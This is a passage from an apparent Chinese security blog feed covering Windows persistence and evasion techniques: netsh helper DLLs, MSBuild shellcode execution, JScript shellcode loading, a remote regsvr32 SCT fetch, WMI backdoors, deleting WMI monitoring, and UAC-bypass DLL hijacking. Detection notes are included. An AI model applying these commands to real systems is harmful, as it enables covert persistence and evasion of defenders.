DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved) payload为创建新线程执行shellcode 项目地址如下： https://github.com/outflankbv/NetshHelperBeacon 0x03 添加自定义helper dll 注： 需要管理员权限 通过cmd添加: netsh add helper c:\test\netshtest.dll 如图 如下图，注册表同步创建键值 位置：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh 名称：netshtest 类型：REG_SZ 数据：c:\test\netshtest.dll 注： 通过注册表直接添加键值同netsh add 添加helper dll的作用一样 0x04 触发后门 helper dll添加成功后，每次调用netsh，均会加载c:\test\netshtest.dll 如图，运行netsh命令，加载c:\test\netshtest.dll，弹出计算器 验证： 使用Process Explorer查看netsh进程加载的dll 如图 使用Process Monitor在进程属性Event Properties也可以查看 如图 0x05 Persistence netsh作为系统常用命令，存在被用户正常使用的概率，所以只要启动netsh即可触发payload 如果被添加为常用的开机启动项，也很有迷惑性，因为显示的仅仅是启动netsh.exe 0x06 检测 监控注册表位置HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh 注： netsh show helper命令并不能查到新添加的helper dll 需要留意注册表内正常的dll是否被替换 0x07 清除 通过cmd: netsh delete helper c:\test\netshtest.dll 通过注册表: 在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh删除对应键值 0x08 小结 Netsh Persistence实现的前提是已经获得了管理员权限 部分vpn软件在启动过程中会调用netsh命令，这样就解决了Netsh Persistence的自启动问题，该方法值得测试 如果在开机启动项中发现有netsh，值得留意，需要查看对应注册表键值中是否包含恶意的helper dll 不同系统中注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh下的默认键值存在差异，需要对比查找默认键值是否被篡改 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Use MSBuild To Do More]]></title>
    <url>%2Fposts%2F6e34ae6c.html</url>
    <content type="text"><![CDATA[0x00 前言 最近Casey Smith@subTee更新了一系列关于”MSBuild”的研究进展，对我有很大启发。本文将基于他公开的POC，并结合我的研究心得，介绍以下MSBuild的应用技巧： Execute PowerShell Commands Execute PE file Execute Shellcode VisualStudio Persistence 0x01 简介 MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台 MSBuild可在未安装Visual Studio的环境中编译.net的工程文件 MSBuild可编译特定格式的xml文件 更多基本知识可参照以下链接： https://msdn.microsoft.com/en-us/library/dd393574.aspx 0x02 常规用法 1. 编译xml文件并执行代码&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; &lt;Project xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt; &lt;Target Name=&quot;PrintCurrentDateTime&quot;&gt; &lt;Message Text=&quot;The current date and time is: $(&amp;#91;System.DateTime&amp;#93;::Now).&quot; /&gt; &lt;/Target&gt; &lt;/Project&gt; 保存为test.csproj cmd下执行： C:\Windows\Microsoft.Net\Framework\v4.0.30319\msbuild.exe test.csproj 在cmd下会输出显示当前时间，如图 2. 编译xml文件生成exeusing System; class Test { static void Main() { Console.WriteLine(&quot;Hello world&quot;); } } 保存为hello.cs &lt;Project xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt; &lt;Target Name=&quot;Compile&quot;&gt; &lt;CSC Sources=&quot;hello.cs&quot; OutputAssembly=&quot;hello.exe&quot; /&gt; &lt;/Target&gt; &lt;/Project&gt; 保存为hello.csproj hello.cs和hello.csproj放于同一目录 cmd下执行： C:\Windows\Microsoft.Net\Framework\v4.0.30319\msbuild.exe hello.csproj 可以编译生成hello.exe 如图 注： 编译文件满足xml文件格式即可，后缀名任意 0x03 扩展用法 在.NET Framework 4.0中支持了一项新功能”Inline Tasks”，被包含在元素UsingTask中，可用来在xml文件中执行c#代码 详细介绍可参考如下链接： https://msdn.microsoft.com/en-us/library/dd722601.aspx?f=255&amp;MSPPError=-2147217396 1. HelloWorld示例以下代码保存为helloworld: &lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt; &lt;Target Name=&quot;Hello&quot;&gt; &lt;HelloWorld /&gt; &lt;/Target&gt; &lt;UsingTask TaskName=&quot;HelloWorld&quot; TaskFactory=&quot;CodeTaskFactory&quot; AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt; &lt;ParameterGroup/&gt; &lt;Task&gt; &lt;Using Namespace=&quot;System&quot; /&gt; &lt;Code Type=&quot;Fragment&quot; Language=&quot;cs&quot;&gt; &lt;![CDATA[ Console.WriteLine(&quot;Hello World&quot;); ]]&gt; &lt;/Code&gt; &lt;/Task&gt; &lt;/UsingTask&gt; &lt;/Project&gt; 注： 保存的文件名任意 cmd下执行： C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe helloworld cmd输出helloworld 如图 2. 执行powershell命令可参照Casey分享的POC，地址如下： https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614 该POC已将c#代码转换成xml文件的格式，编写需要注意的部分如下： 如图 标记1TaskName可修改，但两个位置的名称需要对应 标记2为固定格式:TaskFactory=&quot;CodeTaskFactory&quot; 标记3的路径在不同系统可能会有区别，准确的为： &quot;$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll&quot; 系统默认安装路径为: &quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; 标记4为一个简单的输出helloworld实例 如图 标记5为固定格式，定义为public class ClassExample : Task, ITask 实际测试POC如图,成功执行powershell命令 3. 执行PE文件Casey分享的POC地址如下： https://gist.github.com/subTee/ca477b4d19c885bec05ce238cbad6371 但是上传的文件被截断，导致部分代码无法查看，于是尝试自己实现 结合之前研究过的代码，地址如下： https://gist.github.com/subTee/00cdac8990584bd2c2fe 对照上文提到的xml格式，编写代码实现在Inline Tasks中内存加载64位的mimikatz.exe，实现代码的下载地址为： https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml cmd下执行： C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe aa 报错，如图 解决方法： 需要换用64位的.net Framework，原代码无需修改，只需要使用64位的.net Framework加载就好 cmd下执行： C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe aa 加载成功，如图 4. 执行shellcode参考自https://gist.github.com/subTee/a06d4ae23e2517566c52 使用msf生成32位shellcode： use windows/exec set CMD calc.exe set EXITFUNC thread generate -t csharp 同样结合上文提到的xml格式，编写代码实现在Inline Tasks中执行shellcode，实现代码的下载地址为： https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml 保存为SimpleTasks.csproj，在cmd下执行： C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj 如图，成功执行shellcode弹出计算器 在64位系统下，先将shellcode替换为64位，然后换用64位的.net Framework执行即可，代码下载地址为： https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml 如图，成功执行64位shellcode 5. VisualStudio Persistence在《Pay close attention to your download code——Visual Studio trick to run code when building》中介绍过利用VisualStudio的.csproj文件实现的代码执行，同样Inline Tasks也可用到此处，实现代码已上传，地址为： https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode%20when%20visual%20studio%20is%20afterBuild.csproj 修改vs工程中的.csproj文件，添加上述代码，能够实现在vs工程编译过程中执行shellcode 如图 0x04 小结 利用MSBuild实现的代码执行，有如下特点： 可绕过应用程序白名单 提供一种直接执行shellcode的方法 在内存中执行PE文件 结合VisualStudio实现的钓鱼和后门 所以建议对系统中的msbuild.exe进行更多的监控和限制。 注： 文中相关POC代码已上传至github，地址为： https://github.com/3gstudent/msbuild-inline-task LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Study Notes Weekly No.2(Shellcode Via JScript & VBScript)]]></title>
    <url>%2Fposts%2Ffe94a0c6.html</url>
    <content type="text"><![CDATA[About: DynamicWrapperX Generate shellcode Write JS and SCT script How to use Detection 目录： 介绍如何配置使用脚本附加库DynamicWrapperX 通过JS/VBS实现对win32 API的调用 如何在js脚本中加载shellcode 结合sct的攻击思路 补充在64位下的使用方法 对该方法的检测 Reference: http://subt0x10.blogspot.com/2016/09/shellcode-via-jscript-vbscript.html 0x00 前言 Casey Smith@subTee近日更新了新的博客，介绍了如何利用脚本附加库DynamicWrapperX实现JS/VBS对win32 API的调用，我很感兴趣，于是对其进行了学习研究。本文用来记录测试心得并补充个人理解。 0x01 DynamicWrapperX简介 1. 下载获得dynwrapx.dll下载地址： http://www.script-coding.com/dynwrapx_eng.html 注册DynamicWrapperX: regsvr32 /i dynwrapx.dll 卸载DynamicWrapperX: regsvr32 /u /i dynwrapx.dll 注： /i表示对当前用户操作，当前用户权限即可；如何不加/i，代表对所有用户操作，需要管理员权限 /s可去掉注册成功弹出的提示框 2. 通过JS/VBS来调用win32 API注册组件后就可以通过JS/VBS来调用win32 API js脚本弹框实例: DX = new ActiveXObject(&quot;DynamicWrapperX&quot;); // Create an object instance. DX.Register(&quot;user32.dll&quot;, &quot;MessageBoxW&quot;, &quot;i=hwwu&quot;, &quot;r=l&quot;); // Register a dll function. res = DX.MessageBoxW(0, &quot;Hello, world!&quot;, &quot;Test&quot;, 4); // Call the function. 注册前，js脚本执行失败，如图 注册组件，执行 regsvr32 /i dynwrapx.dll 再次执行js脚本，成功弹框，如图 成功调用win32 API dynwrapx.dll是一个32位的dll，所以在64位系统下通过regsvr32 /i dynwrapx.dll注册后，在使用js调用win32 API时注意需要选择32位的cscript.exe，代码如下： C:\Windows\SysWow64\cscript.exe a.js 如图,默认64位cscript.exe无法调用COM组件，换成32位，执行成功 vbs脚本弹框实例： Set DX = CreateObject(&quot;DynamicWrapperX&quot;) &#39; Create an object instance. DX.Register &quot;user32.dll&quot;, &quot;MessageBoxW&quot;, &quot;i=hwwu&quot;, &quot;r=l&quot; &#39; Register a dll function. res = DX.MessageBoxW(0, &quot;Hello, world!&quot;, &quot;Test&quot;, 4) &#39; Call the function. 0x02 生成shellcode 使用msf： use windows/exec set CMD calc.exe generate -t csharp 如图 获得shellcode byte[] buf = new byte[193] { 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30, 0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff, 0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52, 0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1, 0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b, 0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03, 0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b, 0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24, 0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb, 0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f, 0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5, 0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a, 0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 }; 0x03 js脚本加载shellcode 步骤： 通过VirtualAlloc申请一块具有RWX权限的内存，函数返回值为内存的基地址 向这段内存写入shellcode 调用CreateThread加载shellcode 实例代码如下： https://gist.github.com/subTee/ca6ab8ec75ec38c213da580cd0de30fe 代码比较简洁，在此不做详细介绍，直接替换其中的shellcode，正常执行，如图 注：VirtualAlloc第二个参数表示分配内存的大小，shellcode的长度不要超过这个数值 DynamicWrapperX 1.0提供了英文版说明，可对照语法进行二次开发，参考地址如下： http://www.script-coding.com/dynwrapx_eng.html DynamicWrapperX 2.0中默认提供英文帮助文档，语法有细微变化，需要注意 0x04 regsvr32利用方式 前面提到过dynwrapx.dll是一个32位的dll，注册的组件也只能供32位程序调用 所以在64位系统下使用需要注意如下： 只支持x86 shellcode 在64位系统下要使用syswow64文件夹下的32位程序 利用方式： C:\Windows\SysWow64\regsvr32.exe /s /u /i:[sct路径] scrobj.dll 将js代码写到sct文件中，就可以将其放到服务器上 实现远程调用sct的实例地址： https://gist.github.com/subTee/ca6ab8ec75ec38c213da580cd0de30fe 自动化download, register dll, execute Shellcode的实例地址： https://gist.github.com/subTee/aa548b36b5d3c8f07e2024ab39217712 里面多了一个调用certuil.exe对文件进行base64加解密 cmd下执行如下代码实现远程调用sct： C:\Windows\SysWow64\regsvr32.exe /s /u /i:https://gist.githubusercont ent.com/subTee/aa548b36b5d3c8f07e2024ab39217712/raw/5dc12c648229574e6172a70ba13f db220ef1a2e8/Dropper.Sct scrobj.dll 注： 使用前需要提前安装DynamicWrapperX 实际测试如图 0x05 补充 最新的DynamicWrapperX已经支持x64，版本为DynamicWrapperX 2.0 相关地址： http://www.minner.ru/html/Dynwrapx.html 在64位系统上面需要分别注册32位和64位的DynamicWrapperX 64位dll注册成功后，js脚本可直接运行，如图 注： 使用DynamicWrapperX 2.0需要提前卸载DynamicWrapperX 1.0 否则，使用2.0需要将object改为DynamicWrapperX.2，如： new ActiveXObject(&quot;DynamicWrapperX&quot;)改为new ActiveXObject(&quot;DynamicWrapperX.2&quot;) 如图 0x06 防御 该方法利用的前提是注册dynwrapx.dll，所以通过查看系统已注册的com组件就能够检测该方法 推荐工具： RegDllView 下载地址： http://www.nirsoft.net/utils/registered_dll_view.html 特点： 显示所有注册DLL/OCX / exe文件列表 查看注册的最近时间 查看CLSID和ProgID 可以手动卸载DLL/OCX文件 可以手动注册DLL/OCX文件 如图，通过查看已注册的COM控件，找到dynwrapx.dll 手动卸载组件，即可限制该方法的运用。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Study Notes Weekly No.1(Monitor WMI & ExportsToC++ & Use DiskCleanup bypass UAC)]]></title>
    <url>%2Fposts%2F99648769.html</url>
    <content type="text"><![CDATA[About: Monitor WMI Persistence Instructions about ExportsToC++ My test of using DiskCleanup on Windows 10 using DiskCleanup 目录： 介绍如何在系统日志中记录WMI Persistence，测试并分析如何绕过 dll劫持中会用到的一个辅助工具，自动读取dll的导出函数并生成对应的c++代码 实际测试《using DiskCleanup on Windows 10 using DiskCleanup》，记录过程，虽然测试失败，但其中包含的绕过思路值得学习 0x01 Monitor WMI Persistence Reference: https://www.fireeye.com/blog/threat-research/2016/08/wmi_vs_wmi_monitor.html 简介攻击者通常会利用WMI来实现远程执行(如wmiexec)和后门(如WMI Persistence),然而Windows系统默认不会在日志中记录这些操作。于是Timothy Parisi和Evan Pena提出了他们的解决方法： 利用WMI Persistence的方法记录攻击者调用WMI的操作，并将以下结果写入系统日志中，监控系统实时读取系统日志，及时提醒用户受到攻击 Event Consumer Name Event Consumer Command Process Call Method Process Call Command 实际测试作者开源了一个powershell脚本，下载地址如下：https://github.com/realparisi/WMI_Monitor/blob/master/WMIMonitor.ps1 注： powershell版本需要3.0或者更高 以管理员权限运行 测试系统： Windows 8.1 x86 Powershell v3.0 1、运行脚本开启监控 如图 2、模拟攻击者新建一个定时启动后门 powershell代码如下： $filterName = &#39;BotFilter82&#39; $consumerName = &#39;BotConsumer23&#39; $exePath = &#39;C:\Windows\System32\notepad.exe&#39; $Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot; $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @{Name=$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query} -ErrorAction Stop $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath} Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer} wmic在cmd下直接实现的代码如下： wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot; wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;, ExecutablePath=&quot;C:\Windows\System32\notepad.exe&quot;,CommandLineTemplate=&quot;C:\Windows\System32\notepad.exe&quot; wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;BotFilter82\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;BotConsumer23\&quot;&quot; 注： 代码具体含义在《WMI Attacks》、《WMI Backdoor》、《WMI Defense》、《Study Notes of WMI Persistence using wmic.exe》作过具体介绍，此处略 3、查看系统日志 控制面板-系统和安全-查看事件日志-事件查看器（本地）-Windows日志-应用程序 找到事件ID为8的事件，查看详细信息，如图 记录了如下信息： ==New WMI Consumer Created== Consumer Name: BotConsumer23 Command Executed: C:\Windows\System32\notepad.exe 4、结论 系统日志成功记录攻击者留下的后门 站在攻击者角度的思考如果攻击者能够实现WMI Persistence，代表其已经获得了管理员权限，那么可通过如下命令来查看已注册的WMI信息： 通过powershell查看的代码： Filters： Get-WMIObject -Namespace root\Subscription -Class __EventFilter Event Consumers： Get-WMIObject -Namespace root\Subscription -Class __EventConsumer Event Bindings： Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding 通过wmic查看的代码： Filters： wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter GET __RELPATH /FORMAT:list Event Consumers： wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list Event Bindings： wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list 如图，能够查看防御者留下的监控代码，那么当然可以通过命令行来删除监控，而更重要的是查看和删除操作不会被记录到日志中 通过powershell实现的删除代码如下： Get-WmiObject __eventFilter -namespace root\subscription -filter &quot;name=&#39;_PersistenceEvent_&#39;&quot;| Remove-WmiObject Get-WmiObject __eventFilter -namespace root\subscription -filter &quot;name=&#39;_ProcessCreationEvent_&#39;&quot;| Remove-WmiObject Remove-WmiObject -Path &quot;ROOT\subscription:NTEventLogEventConsumer.Name=&#39;_LogWMIConsumerEvent_&#39;&quot; Remove-WmiObject -Path &quot;ROOT\subscription:NTEventLogEventConsumer.Name=&#39;_LogWMIProcessCreationEvent_&#39;&quot; Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match &#39;_ProcessCreationEvent_&#39;} | Remove-WmiObject Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match &#39;_PersistenceEvent_&#39;} | Remove-WmiObject 综上，站在攻击者的角度，可能的绕过方法如下： (1) 查看EventFilter 和 EventConsumer instances (2) 删除监控功能的WMI实例 (3) 留下自己的WMI后门 (4) 手动再次开启监控功能的WMI实例 补充公开的POC powershell脚本仅作为演示，在实际防御中要对以下操作进行记录：_FilterToConsumerBinding,__EventFilter, and __EventConsumer instances Win10和Server2016将会解决上述问题 Matt Graeber@mattifestation: “in Win 10 and I believe Server 2016, Event 5861 inMicrosoft-Windows-WMI-Activity/Operational now captures WMIpersistence. 引用自：https://twitter.com/mattifestation/status/766269596756312064 0x02 Instructions about ExportsToC++Reference: http://uacmeltdown.blogspot.nl/ https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/ https://github.com/michaellandi/exportstoc 简介在实现UACBypass或者Persistence的时候常常会用到dll劫持，实现dll劫持通常会先使用dumpbin查看dll的导出函数，构造一个具有相同导出函数的dll，并在其中添加payload。ExportsToC++ 就是为了简化这个过程，尤其对于包含多个导出函数的dll，大大简化了这个过程。 实际测试下载地址如下： https://github.com/michaellandi/exportstoc 需要环境： .NET 2.0 Framework 安装Microsoft Visual Studio 测试实例：https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/ https://3gstudent.github.io/3gstudent.github.io/Userland-registry-hijacking/ 目的：劫持计划任务UserTask，实现开机启动自己的dll，弹框 方法： 在HKEY_CURRENT_USER\Software\Classes\CLSID\下新建项{58fb76b9-ac85-4e55-ac04-427593b1d060} 新建项InprocServer32 值设定为新dll的绝对路径：c:\test\testexport.dll 劫持的原dll路径： c:\Windows\system32\dimsjob.dll 步骤： 1、运行exportstoc 下载工程并编译，直接运行会报错，如图 解决方法： 运行dumpbin需要VS编译环境，在Visual Studio Tools中找到Developer Command Prompt for VS2012.lnk并运行，在弹出的cmd下运行ExportsToC++.exe 2、生成c++代码 如图 打开原dll： c:\Windows\system32\dimsjob.dll 选择Convert-To C++ Wrapper，输入原dll的绝对路径： c:\Windows\system32\dimsjob.dll 自动生成可供使用的c++代码，如下： #include &lt;iostream&gt; #include &lt;windows.h&gt; using namespace std; #pragma comment (linker, &quot;/export:DllCanUnloadNow=c:\windows\system32\dimsjob.DllCanUnloadNow,@1&quot;) #pragma comment (linker, &quot;/export:DllGetClassObject=c:\windows\system32\dimsjob.DllGetClassObject,@2&quot;) #pragma comment (linker, &quot;/export:DllRegisterServer=c:\windows\system32\dimsjob.DllRegisterServer,@3&quot;) #pragma comment (linker, &quot;/export:DllUnregisterServer=c:\windows\system32\dimsjob.DllUnregisterServer,@4&quot;) BOOL WINAPI DllMain(HINSTANCE hInst,DWORD reason,LPVOID) { return true; } 如图 3、编译 使用vc6.0新建dll工程，添加以上代码并加上payload： MessageBox(NULL,”testexport”,”testexport”,MB_OK); 编译并保存为c:\test\testexport.dll 4、修改注册表，劫持UserTask powershell代码如下： function Invoke-ScheduledTaskComHandlerUserTask { [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = &#39;Medium&#39;)] Param ( [Parameter(Mandatory = $True)] [ValidateNotNullOrEmpty()] [String] $Command, [Switch] $Force ) $ScheduledTaskCommandPath = &quot;HKCU:\Software\Classes\CLSID\{58fb76b9-ac85-4e55-ac04-427593b1d060}\InprocServer32&quot; if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name &#39;(default)&#39; -ErrorAction SilentlyContinue) -eq $null)){ New-Item $ScheduledTaskCommandPath -Force | New-ItemProperty -Name &#39;(Default)&#39; -Value $Command -PropertyType string -Force | Out-Null }else{ Write-Verbose &quot;Key already exists, consider using -Force&quot; exit } if (Test-Path $ScheduledTaskCommandPath) { Write-Verbose &quot;Created registry entries to hijack the UserTask&quot; }else{ Write-Warning &quot;Failed to create registry key, exiting&quot; exit } } Invoke-ScheduledTaskComHandlerUserTask -Command &quot;c:\test\testexport.dll&quot; -Verbose 5、注销用户，重启测试 弹框成功 如图 使用Process Explorer查看进程taskhost.exe，成功加载新的dll，如图 注： 在https://3gstudent.github.io/3gstudent.github.io/Userland-registry-hijacking/中使用的方法弹框后taskhost.exe进程报错，未给出bug的解决方法，本文介绍的方式能够解决这个bug 0x03 My test of using DiskCleanup on Windows 10 using DiskCleanupReference: https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/ 简介Win10系统中存在一个叫作”SilentCleanup”的计划任务，任务运行时会作如下操作： 以high权限运行cleanmgr.exe 创建临时目录C:\Users\\AppData\Local\Temp\GUID 将system32\Dism下的DismHost.exe及其运行时需要加载的dll复制到该临时目录 以high权限运行DismHost.exe 删除临时目录所有内容 绕过思路 监控临时目录的生成 替换复制到该临时目录的dll，为确保及时，覆盖DismHost.exe最后加载的dll：LogProvider.dll DismHost.exe启动时加载替换过的dll，实现UACBypass POC脚本下载地址： https://gist.github.com/mattifestation/b4072a066574caccfa07fcf723952d54 实际测试测试系统： Win10 x64 补丁： KB3173428(无法手动卸载) 测试过程： 1、正常启动计划任务SilentCleanup 开启ProcessMonitor 手动开启服务SilentCleanup 如图 cleanmgr.exe创建临时目录 如图 切换到临时目录查看复制过来的dll 如图 high权限运行的DismHost.exe 如图 2、通过POC脚本启动计划任务并测试 开启ProcessMonitor 根据LogProvider.dll的导出函数编写新的dll(过程略，可参考0x02) 执行poc脚本 临时目录创建成功 接下来出现两种情况： (1)LogProvider.dll替换失败 (2)脚本显示dll文件替换成功，输出显示UACBypass成功，然而新的dll并没有加载 查看临时目录，发现创建两个GUID文件夹，一个是包含正常LogProvider.dll的目录，另一个是LogProvider.dll被替换成新dll的目录 DismHost.exe正常启动，但没有加载新的dll 测试失败 补充： 虽然测试失败，但是绕过思路值得学习： POC通过注册WMI事件来监控特定文件目录 当目录下有特定文件生成的时候对其替换 进而实现dll劫持 这种替换思路在其他方面也会用到，值得收藏。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Userland registry hijacking]]></title>
    <url>%2Fposts%2Fb8d42b34.html</url>
    <content type="text"><![CDATA[0x00 前言 之前我在研究”Use SCT to Bypass Application Whitelisting Protection”的时候曾有过一个想法：在执行regsvr32命令注册COM组件的过程中，在注册表HKEY_CLASSES_ROOT\CLSID\下会同步创建COM组件的键值，并且classid的子项InprocServer32下会包含scrobj.dll的绝对路径，那么如果修改了子项InprocServer32的键值，能否实现对某些操作的劫持？ 然而实际修改HKCR\CLSID\下的键值需要管理员权限，因此没有对这个想法深入研究。直到最近，Matt Nelson@enigma0x3的博客给了我新的思路，只需要普通用户权限就可以实现对高权限系统注册表键值的劫持，让我对userland registry hijacking有了新的认识。 0x01 简介 本文将对userland registry hijacking的原理进行介绍，实例分析在Userland Persistence和BypassUAC两方面的具体应用，借助Process Monitor，介绍一种寻找BypassUAC的方法。 0x02 Userland registry hijacking原理 1、键值同步修改HKCU:\Software\Classes\下的键值中默认名称的数据，可以同时修改HKCR:\下对应键值默认名称的数据(前提是HKCR:\已存在此注册表项) 例如： 编辑HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command的默认值为c:\test\admin.exe 如图 注： 默认HKEY_CURRENT_USER\Software\Classes\下不存在mscfile\shell\open\command，需要自己创建 定位到HKEY_CLASSES_ROOT\mscfile\shell\open\command下，发现默认值被自动修改为c:\test\admin.exe 如图 注： 在HKCU:\Software\Classes\CLSID下新建一个HKCR:\CLSID不存在的键值，并不会更新HKCR:\CLSID的数据 如图 新建HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command\1，默认名称的数据设为1，然而HKEY_CLASSES_ROOT\mscfile\shell\open\command并不会新建子项1 2、权限 修改HKCU下的键值只需要普通用户权限 修改HKCR下的键值需要管理员权限 综上，只需要以普通用户的权限编辑HKCU:\Software\Classes\下的键值就可以同步修改对应管理员权限HKCR下的键值。 根据以上介绍的原理，可具体应用在Userland Persistence和BypassUAC两方面： 0x03 Userland Persistence With Scheduled Tasks 如果劫持系统某个计划任务对应的注册表键值，修改其中要启动的dll绝对路径，那么仅需普通用户权限就能实现一个后门，具体操作如下： 1、查看计划任务同注册表的对应关系系统中的计划任务同注册表HKCU:\Software\Classes\CLSID\下的键值存在对应关系，可借助Matt Nelson@enigma0x3分享的脚本直接查看 下载地址： https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Get-ScheduledTaskComHandler.ps1 注： 通过计划任务面板查看的信息不完全，计划任务面板的打开方式为：我的电脑-右键-管理，找到计划任务，如图 ps脚本获取的部分对应关系如图 可获得每个计划任务对应注册表键值的位置和启动的dll 2、修改对应键值中的dll位置找到对应关系后，需要定位具体的注册表键值位置，即HKEY_CURRENT_USER\Software\Classes\CLSID{CLSID},通常情况HKCU下该键值不存在，需要手动建立，默认值设为需要运行的测试dll的绝对路径，键值创建后HKCR下的键值会同步更新，计划任务启动的dll随之被修改。 实例： 1、查看计划任务同注册表的对应关系 运行Get-ScheduledTaskComHandler找到可被劫持的dll，挑选一个通用的计划任务——UserTask，详细信息如下： TaskName : UserTask CLSID : {58fb76b9-ac85-4e55-ac04-427593b1d060} Dll : C:\Windows\system32\dimsjob.dll Logon : True IsUserContext : True 注： 此操作需要查找HKCR下的键值，所以需要管理员权限才可以获得 2、修改对应键值中的dll位置 在HKEY_CURRENT_USER\Software\Classes\CLSID\下新建项{58fb76b9-ac85-4e55-ac04-427593b1d060} 接着新建项InprocServer32 值设定为c:\test\MessageBox32.dll 注： 注册表项{58fb76b9-ac85-4e55-ac04-427593b1d060}通用，不同系统下键值名称相同 MessageBox32.dll下载地址为： https://github.com/enigma0x3/MessageBox 实际测试发现https://github.com/enigma0x3/MessageBox/tree/master/bin的dll在win7下失效，使用源代码重新编译生成新的dll可以使用 此时查看HKEY_CLASSES_ROOT\CLSID{58fb76b9-ac85-4e55-ac04-427593b1d060}\InprocServer32，默认值被修改为c:\test\MessageBox32.dll，如图 注销用户，重新登录，MessageBox32.dll被加载，弹框 